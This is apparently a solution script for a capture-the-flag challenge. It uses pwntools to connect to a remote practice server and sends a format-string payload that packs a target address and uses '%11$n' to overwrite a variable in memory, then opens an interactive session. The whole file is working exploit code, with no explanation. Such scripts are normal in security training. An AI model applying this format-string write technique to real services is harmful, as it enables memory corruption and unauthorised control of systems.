from pwn import *

#n = process('./fm')
n = remote('pwn2.jarvisoj.com',9895)

x_addr = 0x0804A02C
payload = p32(x_addr) + '%11$n'
n.sendline(payload)
n.interactive()
